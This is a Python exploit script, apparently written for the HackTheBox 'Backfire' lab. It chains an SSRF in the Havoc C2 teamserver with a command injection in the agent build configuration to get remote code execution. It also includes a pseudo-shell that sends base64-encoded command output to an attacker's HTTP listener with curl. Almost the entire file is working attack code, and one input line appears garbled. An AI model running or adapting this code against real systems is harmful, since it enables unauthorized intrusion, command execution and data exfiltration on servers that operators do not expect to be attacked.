#!/usr/bin/env python3
#
# Exploit for Havoc SSRF + RCE for Backfire from HackTheBox with a Pseudo Shell
# 
# Unauthenticated SSRF on Havoc C2 teamserver via spoofed demon agent (CVE-2024-4157) -> https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/
# Havoc RCE -> https://github.com/IncludeSecurity/c2-vulnerabilities/tree/main/havoc_auth_rce
# 

import binascii
import random
import requests
import argparse
import urllib3 
import base64
import os
import hashlib
import json
import struct
urllib3.disable_warnings()
import threading
import http.server
import time 
import threading
import secrets
import sys
import io

from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from Crypto.Cipher import AES
from Crypto.Util import Counter

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("Response:")
        response = base64.b64decode(self.path[1:]).decode('utf-8').replace('\\n','\n')
        print(response)

key_bytes = 32

def decrypt(key, iv, ciphertext):
    if len(key) <= key_bytes:
        for _ in range(len(key), key_bytes):
            key += b"0"

    assert len(key) == key_bytes

    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)

    plaintext = aes.decrypt(ciphertext)
    return plaintext

def int_to_bytes(value, length=4, byteorder="big"):
    return value.to_bytes(length, byteorder)

def encrypt(key, iv, plaintext):

    if len(key) <= key_bytes:
        for x in range(len(key),key_bytes):
            key = key + b"0"

        assert len(key) == key_bytes

        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)

        ciphertext = aes.encrypt(plaintext)
        return ciphertext

def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
    # DEMON_INITIALIZE / 99
    command = b"\x00\x00\x00\x63"
    request_id = b"\x00\x00\x00\x01"
    demon_id = agent_id

    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)

    data =  b"\xab" * 100

    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id

    print("[***] Trying to register agent...")
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")

def open_socket(socket_id, target_address, target_port):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x02"

    # SOCKET_COMMAND_OPEN / 16
    subcommand = b"\x00\x00\x00\x10"
    sub_request_id = b"\x00\x00\x00\x03"

    local_addr = b"\x22\x22\x22\x22"
    local_port = b"\x33\x33\x33\x33"


    forward_addr = b""
    for octet in target_address.split(".")[::-1]:
        forward_addr += int_to_bytes(int(octet), length=1)

    forward_port = int_to_bytes(target_port)

    package = subcommand+socket_id+local_addr+local_port+forward_addr+forward_port
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data


    print("[***] Trying to open socket on the teamserver...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")

def write_socket(socket_id, data):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x08"

    # SOCKET_COMMAND_READ / 11
    subcommand = b"\x00\x00\x00\x11"
    sub_request_id = b"\x00\x00\x00\xa1"

    # SOCKET_TYPE_CLIENT / 3
    socket_type = b"\x00\x00\x00\x03"
    success = b"\x00\x00\x00\x01"

    data_length = int_to_bytes(len(data))

    package = subcommand+socket_id+socket_type+success+data_length+data
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    post_data = agent_header + header_data

    print("[***] Trying to write to the socket")
    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to write data to the socket - {r.status_code} {r.text}")

def read_socket(socket_id):
    # COMMAND_GET_JOB / 1
    command = b"\x00\x00\x00\x01"
    request_id = b"\x00\x00\x00\x09"

    header_data = command + request_id

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data


    print("[***] Trying to poll teamserver for socket output...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    #print(r.content)
    if r.status_code == 200:
        print("[***] Read socket output successfully!")
    else:
        print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return ""


    command_id = int.from_bytes(r.content[0:4], "little")
    request_id = int.from_bytes(r.content[4:8], "little")
    package_size = int.from_bytes(r.content[8:12], "little")
    enc_package = r.content[12:]

    return decrypt(AES_Key, AES_IV, enc_package)[12:]

def generate_key():
    key = secrets.token_bytes(16)
    return base64.b64encode(key).decode()

def apply_mask(data, mask):
    if len(mask) != 4:
        raise ValueError("mask must contain 4 bytes")

    data_int = int.from_bytes(data, sys.byteorder)
    mask_repeated = mask * (len(data) // 4) + mask[: len(data) % 4]
    mask_int = int.from_bytes(mask_repeated, sys.byteorder)
    return (data_int ^ mask_int).to_bytes(len(data), sys.byteorder)

def serialize(data):
    data = data.encode('utf-8')
    output = io.BytesIO()
    head1 = (0b10000000 | 0x01)
    head2 = 0b10000000        

    length = len(data)
    if length < 126:
        output.write(struct.pack("!BB", head1, head2 | length))
    elif length < 65536:
        output.write(struct.pack("!BBH", head1, head2 | 126, length))
    else:
        output.write(struct.pack("!BBQ", head1, head2 | 127, length))
    
    mask_bytes = secrets.token_bytes(4)
    output.write(mask_bytes)

    data = apply_mask(data, mask_bytes)        
    output.write(data)

    return output.getvalue()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="The listener target in URL format", required=True)
    parser.add_argument("-i", "--ip", help="The IP to open the socket with", required=True)
    parser.add_argument("-p", "--port", help="The port to open the socket with", required=True)

    parser.add_argument("-A", "--user-agent", help="The User-Agent for the spoofed agent", default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
    parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", default="DESKTOP-7F61JT1")
    parser.add_argument("-u", "--username", help="The username for the spoofed agent", default="Administrator")
    parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agent", default="ECORP")
    parser.add_argument("-n", "--process-name", help="The process name for the spoofed agent", default="msedge.exe")
    parser.add_argument("-ip", "--internal-ip", help="The internal ip for the spoofed agent", default="10.1.33.7")

    parser.add_argument("-U", "--user", help="The username for Havoc Authentication")
    parser.add_argument("-P", "--password", help="The password for Havoc Authentication")
    parser.add_argument("-c", "--cmd", help="Command to execute in the machine.", default="whoami")

    parser.add_argument("-s", "--shell", action="store_true", help="Executes commands in the machine and the output is sent back to a http server.")
    parser.add_argument("-lh", "--lhost", help="IP Address to send the output of the commands.",default='0.0.0.0')
    parser.add_argument("-lp", "--lport", help="Port to send to the output of the commands.", default=8080)

    args = parser.parse_args()

    # 0xDEADBEEF
    magic = b"\xde\xad\xbe\xef"
    teamserver_listener_url = args.target
    headers = {
            "User-Agent": args.user_agent
    }
    agent_id = int_to_bytes(random.randint(100000, 1000000))
    AES_Key = b"\x00" * 32
    AES_IV = b"\x00" * 16
    hostname = bytes(args.hostname, encoding="utf-8")
    username = bytes(args.username, encoding="utf-8")
    domain_name = bytes(args.domain_name, encoding="utf-8")
    internal_ip = bytes(args.internal_ip, encoding="utf-8")
    process_name = args.process_name.encode("utf-16le")
    process_id = int_to_bytes(random.randint(1000, 5000))    
    cmd = str(args.cmd)

    # Register Agent
    register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)
    socket_id = b"\x11\x11\x11\x11"
    open_socket(socket_id, args.ip, int(args.port))

    # Handshake
    websocket_key = generate_key()
    handshake = f'GET /havoc/ HTTP/1.1\r\nHost: 127.0.0.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key:  {websocket_key}\r\nSec-WebSocket-Version: 13\r\n\r\n'.encode()
    write_socket(socket_id, bytes(handshake))    

    # Authentication
    print("[+] Authenticating ...")
    payload = {
            "Body": 
                    {
                    "Info": {
                            "Password": hashlib.sha3_256(args.password.encode()).hexdigest(), 
                            "User": args.user
                    }, 
                    "SubEvent": 3
                    }, 
                    "Head": {
                            "Event": 1, 
                            "OneTime": "", 
                            "Time": "18:40:17", 
                            "User": args.user
                    }
    }

    data = json.dumps(payload)    
    data = serialize(data)  
    write_socket(socket_id, data)    

    # Create a listener to build demon agent for
    print("[+] Creating listener ...")
    payload = {
       "Body":{
          "Info":{
             "Headers":"",
             "HostBind":"0.0.0.0",
             "HostHeader":"",
             "HostRotation":"round-robin",
             "Hosts":"0.0.0.0",
             "Name":"abc",
             "PortBind":"443",
             "PortConn":"443",
             "Protocol":"Https",
             "Proxy Enabled":"false",
             "Secure":"true",
             "Status":"online",
             "Uris":"",
             "UserAgent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
          },
          "SubEvent":1
       },
       "Head":{
          "Event":2,
          "OneTime":"",
          "Time":"08:39:18",
          "User":args.user
       }
    }
    data = json.dumps(payload)    
    data = serialize(data)  
    write_socket(socket_id, data)    

    if args.cmd:
        # Command injection in demon compilation command
        injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
        payload = {
               "Body":{
                  "Info":{
                     "AgentType":"Demon",
                     "Arch":"x64",
                     "Config":f"{{\n    \"Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {{\n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    }},\n    \"Jitter\": \"0\",\n    \"Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"{injection}\",\n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}}\n",
                     "Format":"Windows Service Exe",
                     "Listener":"abc"
                  },
                  "SubEvent":2
               },
               "Head":{
                  "Event":5,
                  "OneTime":"true",
                  "Time":"18:39:04",
                  "User":args.user
               }
            }

        data = json.dumps(payload)
        print(f"\n[+] Executing command: `{cmd}`\n")
        data = serialize(data)  
        write_socket(socket_id, data)
        
    if args.shell:
        # "Interactive Shell"
        print("[+] Executing \"interactive shell\" (not actually) ...")
        server = http.server.ThreadingHTTPServer((str(args.lhost), int(args.lport)), Handler)
        #server = http.server.ThreadingHTTPServer(('0.0.0.0', 9090), Handler)
        print(f"[+] Starting HTTP Server in background ...")
        print(f"[+] Output will send to: {args.lhost}:{args.lport}")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = True
        thread.start()

        while True:
            cmd = input("$ ")[+] 
            if cmd.lower() in ["exit","quit"]:
                break

            #cmd = f"curl -s 10.10.14.194:9090/$({cmd}|base64 -w 0)"
            cmd = f"curl -s {str(args.lhost)}:{str(args.lport)}/$({cmd}|base64 -w 0)"
            injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
            payload = {
               "Body":{
                  "Info":{
                     "AgentType":"Demon",
                     "Arch":"x64",
                     "Config":f"{{\n    \"Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {{\n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    }},\n    \"Jitter\": \"0\",\n    \"Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"{injection}\",\n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}}\n",
                     "Format":"Windows Service Exe",
                     "Listener":"abc"
                  },
                  "SubEvent":2
               },
               "Head":{
                  "Event":5,
                  "OneTime":"true",
                  "Time":"18:39:04",
                  "User":args.user
               }
            } 

            data = json.dumps(payload)
            print("[+] Executing command ...")
            data = serialize(data)  
            write_socket(socket_id, data)            